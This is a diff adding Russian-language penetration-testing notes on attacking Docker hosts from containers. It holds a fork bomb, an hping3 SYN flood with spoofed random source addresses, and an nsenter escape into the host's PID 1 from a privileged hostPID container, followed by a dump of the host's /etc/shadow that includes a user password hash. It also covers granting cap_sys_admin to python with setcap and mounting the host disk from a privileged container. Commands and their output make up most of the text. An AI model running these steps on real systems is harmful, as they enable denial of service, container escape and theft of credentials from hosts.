@@ -1,0 +1,189 @@
+#### DoS из контейнера
+Если ресурсы, которые может использовать контейнер не ограничены, скомпрометированный контейнер может провести DoS-атаку на хосте, на котором он запущен.
+
+DoS ЦП
+# Start container
+root@msx:/home/qwerty/Desktop# docker run -d --name malicious-container busybox 
+root@msx:/home/qwerty/Desktop# docker exec -ti id_container /bin/sh
+# Run in command line 
+root@19cf8c5aa7bd:/# :(){ :|:& };:
+
+DoS сети
+root@19cf8c5aa7bd:/# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source IP_Victim
+
+hping3 = Application binary name.
+-c 100000 = Number of packets to send.
+-d 120 = Size of each packet to be sent to the target machine.
+-S = I only send SYN packets.
+-w 64 = TCP window size.
+-p 21 = Destination port (FTP port 21 is used). You can use any port here.
+–flood = Send packets as fast as possible, without worrying about displaying incoming packets. Let's solve the flood.
+–rand-source = Use random source IP addresses. You can also use -a or –spoof to hide the hostname. See man hping3 for details.
+192.168.1.37 = Destination IP address or IP address of the target machine. You can also use here FQDN
+
+#### Privileged + hostPID
+Подготовка стенда
+docker run --rm -it --pid=host --privileged ubuntu bash
+
+
+С этими разрешениями вы можете легко перейти в пространство имен процесса, запущенного на хосте под пользователем root, например, в процесс init (pid: 1), выполнив следующую команду:
+
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+
+Чтобы протестировать эту возможность в контейнере, выполните следующие команды:
+
+root@msx:/home/qwerty/Desktop# docker run --rm -it --pid=host --privileged ubuntu bash
+root@5dd06594e9f8:/# nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+root@msx:/# cat /etc/shadow
+root:*:19837:0:99999:7:::
+daemon:*:19837:0:99999:7:::
+bin:*:19837:0:99999:7:::
+sys:*:19837:0:99999:7:::
+sync:*:19837:0:99999:7:::
+games:*:19837:0:99999:7:::
+man:*:19837:0:99999:7:::
+lp:*:19837:0:99999:7:::
+mail:*:19837:0:99999:7:::
+news:*:19837:0:99999:7:::
+uucp:*:19837:0:99999:7:::
+proxy:*:19837:0:99999:7:::
+www-data:*:19837:0:99999:7:::
+backup:*:19837:0:99999:7:::
+list:*:19837:0:99999:7:::
+irc:*:19837:0:99999:7:::
+_apt:*:19837:0:99999:7:::
+nobody:*:19837:0:99999:7:::
+systemd-network:!*:19837::::::
+systemd-timesync:!*:19837::::::
+dhcpcd:!:19837::::::
+messagebus:!:19837::::::
+syslog:!:19837::::::
+systemd-resolve:!*:19837::::::
+uuidd:!:19837::::::
+usbmux:!:19837::::::
+tss:!:19837::::::
+systemd-oom:!*:19837::::::
+kernoops:!:19837::::::
+whoopsie:!:19837::::::
+dnsmasq:!:19837::::::
+avahi:!:19837::::::
+tcpdump:!:19837::::::
+sssd:!:19837::::::
+speech-dispatcher:!:19837::::::
+cups-pk-helper:!:19837::::::
+fwupd-refresh:!*:19837::::::
+saned:!:19837::::::
+geoclue:!:19837::::::
+cups-browsed:!:19837::::::
+hplip:!:19837::::::
+polkitd:!*:19837::::::
+rtkit:!:19837::::::
+colord:!:19837::::::
+gnome-initial-setup:!:19837::::::
+gdm:!:19837::::::
+nm-openvpn:!:19837::::::
+gnome-remote-desktop:!*:19964::::::
+qwerty:$6$PWgxZ4QHG9KKBUEZ$Ip7MdK1sOWEmSHYXNUdDybXMlf7XIgg1w8Wld5ljDW.ZFXN.deN.HErL2aDizkghnfPRwtzHUlHU1Fk8bcNln.:19964:0:99999:7:::
+openvpn:!:19993::::::
+root@msx:/# ping ya.ru
+PING ya.ru (77.88.55.242) 56(84) bytes of data.
+64 bytes from ya.ru (77.88.55.242): icmp_seq=1 ttl=128 time=42.2 ms
+64 bytes from ya.ru (77.88.55.242): icmp_seq=2 ttl=128 time=41.3 ms
+64 bytes from ya.ru (77.88.55.242): icmp_seq=3 ttl=128 time=21.2 ms
+...
+
+#### CAP_SYS_ADMIN
+CAP_SYS_ADMIN — возможность, часто сопоставляемая с уровнем почти root из-за своих обширных административных привилегий, таких как монтирование устройств и управление функциями ядра.
+
+Проверить активные возможности внутри контейнера Docker можно с помощью:
+
+root@e24bc9486cbf:/usr/bin# capsh --print
+
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+
+В предыдущем выводе видно, что возможность SYS_ADMIN активирована.
+
+Подготовка стенда
+user@msx:/home/qwerty/Desktop$ docker run --rm -it --privileged python:2.7 bash
+
+root@e24bc9486cbf:/# apt update 
+
+root@e24bc9486cbf:/# apt install nano
+
+root@e24bc9486cbf:/# apt install netcat
+
+Пример с двоичным кодом
+root@e24bc9486cbf:/# getcap -r / 2>/dev/null
+
+root@e24bc9486cbf:/# setcap cap_sys_admin+ep /usr/bin/python2.7
+
+#### Монтирование диска внутри контейнера | --privileged
+
+Привилегированный контейнер можно создать с помощью флага --privileged или отключив определённые механизмы защиты:
+
+--cap-add=ALL
+--security-opt apparmor=unconfined
+--security-opt seccomp=unconfined
+--security-opt label:disable
+--pid=host
+--userns=host
+--uts=host
+--cgroupns=host
+Mount /dev
+
+Флаг --privileged значительно снижает безопасность контейнера, предоставляя неограниченный доступ к устройствам и обходя несколько механизмов защиты. 
+
+Только с помощью флага --privileged вы можете попытаться получить доступ к диску хоста или обойти ограничения, связанные с release_agent и другими методами.
+
+Правильно настроенные контейнеры Docker не позволяют выполнять команды типа fdisk -l. Однако при неправильной конфигурации контейнера, например, если указан флаг --privileged или --device=/dev/sda1, можно получить привилегии для доступа к диску хоста.
+
+Чтобы получить к хосту, достаточно выполнить следующие команды: mkdir -p /mnt/hola и mount /dev/sda2 /mnt/hola.
+
+root@msx:/home/qwerty/Desktop# fdisk -f 
+
+root@msx:/home/qwerty/Desktop# docker run --rm -it --privileged ubuntu bash
+
+root@062421d595b9:/# mkdir -p /mnt/hola
+
+root@062421d595b9:/# mount /dev/sda2 /mnt/hola
+
+root@062421d595b9:/# cd /mnt/hola
+
+root@062421d595b9:/mnt/hola# ls -l 
+total 4194412
+lrwxrwxrwx   1 root root          7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x   2 root root       4096 Feb 26  2024 bin.usr-is-merged
+drwxr-xr-x   3 root root       4096 Nov  5 05:45 boot
+dr-xr-xr-x   2 root root       4096 Apr 24  2024 cdrom
+drwxr-xr-x   4 root root       4096 Apr 24  2024 dev
+drwxr-xr-x 156 root root      12288 Nov 11 11:19 etc
+drwxr-xr-x   3 root root       4096 Aug 29 16:29 home
+lrwxrwxrwx   1 root root          7 Apr 22  2024 lib -> usr/lib
+drwxr-xr-x   2 root root       4096 Apr  8  2024 lib.usr-is-merged
+lrwxrwxrwx   1 root root          9 Sep 12 11:18 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root          9 Apr 22  2024 lib64 -> usr/lib64
+drwx------   2 root root      16384 Aug 29 15:47 lost+found
+drwxr-xr-x   3 root root       4096 Aug 29 16:29 media
+drwxr-xr-x   2 root root       4096 Apr 24  2024 mnt
+drwxr-xr-x   5 root root       4096 Oct 10 12:52 opt
+drwxr-xr-x   2 root root       4096 Apr 22  2024 proc
+drwx------  10 root root       4096 Oct 18 06:44 root
+drwxr-xr-x  19 root root       4096 Apr 24  2024 run
+lrwxrwxrwx   1 root root          8 Apr 22  2024 sbin -> usr/sbin
+drwxr-xr-x   2 root root       4096 Mar 31  2024 sbin.usr-is-merged
+drwxr-xr-x  12 root root       4096 Apr 24  2024 snap
+drwxr-xr-x   2 root root       4096 Apr 24  2024 srv
+-rw-------   1 root root 4294967296 Aug 29 16:03 swap.img
+drwxr-xr-x   2 root root       4096 Apr 22  2024 sys
+drwxrwxrwt  22 root root       4096 Nov 12 06:55 tmp
+drwxr-xr-x  13 root root       4096 Sep 12 11:18 usr
+drwxr-xr-x  14 root root       4096 Oct  8 12:56 var
+
